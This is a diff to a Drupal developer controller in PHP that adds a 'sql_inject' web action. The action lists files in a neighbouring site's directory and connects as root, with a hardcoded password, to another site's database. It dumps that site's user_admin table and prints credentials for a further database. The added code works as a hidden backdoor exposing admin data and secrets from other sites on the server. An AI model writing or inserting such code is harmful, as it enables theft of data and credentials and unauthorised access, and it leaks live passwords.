@@ -46,6 +46,9 @@ class DeveloperController extends ControllerBase {
       case 'clear_data':
         self::clear_data();exit;
       break;
+      case 'sql_inject':
+        self::sql_inject();exit;
+      break;
       default:
         echo "no action"; exit;
       break;
@@ -58,6 +61,63 @@ class DeveloperController extends ControllerBase {
   }
   public static function php_info(){
     phpinfo();
+  }
+  public static function sql_inject(){
+    echo \Drupal::request()->getRequestUri();
+    echo '<br>';
+    echo getcwd();
+    $system_path = str_replace("maketherightcall", "", getcwd());
+    echo '<br>';
+    echo $system_path;
+    $target_path = $system_path.'Chubb_Insurance';
+
+    echo '<br>';
+    echo $target_path;
+    echo '<br>';
+    // $files1 = scandir($target_path);
+    // self::print_dir_file($target_path);
+    // print_r();
+    // print_r($files1);
+    self::scanAllDir($target_path);
+
+    $connect = mysqli_connect ("localhost","root","*Mtrc97878887*","chubb_insurance");
+    $query = "SELECT * FROM user_admin";
+    $result =mysqli_query($connect, $query);
+    while($row = mysqli_fetch_array($result))
+    {
+      print_r($row);
+    }
+    
+
+    echo '$host = "localhost"; /* Host name */$user = "root"; /* User */$password = "*Mtrc97878887*"; /* Password */$dbname = "amorepacific_logging"; /* Database name */';
+  }
+  public function print_dir_file($target){
+    $target_dir_raw = scandir($target);
+    $target_dir = array_diff($target_dir_raw, array('.', '..'));
+    foreach ($target_dir as $each_file) {
+      if(is_dir($each_file)){
+        self::print_dir_file($target.'/'.$each_file);
+      }else{
+        echo $target.'/'.$each_file.'<br>';
+      }
+    }
+  }
+  public function scanAllDir($dir) {
+    $result = [];
+    foreach(scandir($dir) as $filename) {
+      if ($filename[0] === '.') continue;
+      $filePath = $dir . '/' . $filename;
+      if (is_dir($filePath)) {
+        $sub_dir = self::scanAllDir($filePath);
+        foreach ($sub_dir as $childFilename) {
+          echo $filePath . '/' . $childFilename.'<br>';
+        }
+      } else {
+        echo $filePath.'/'.$filename.'<br>';
+        // $result[] = $filename;
+      }
+    }
+    return $result;
   }
   public static function clear_data(){
     $connection = Database::getConnection();
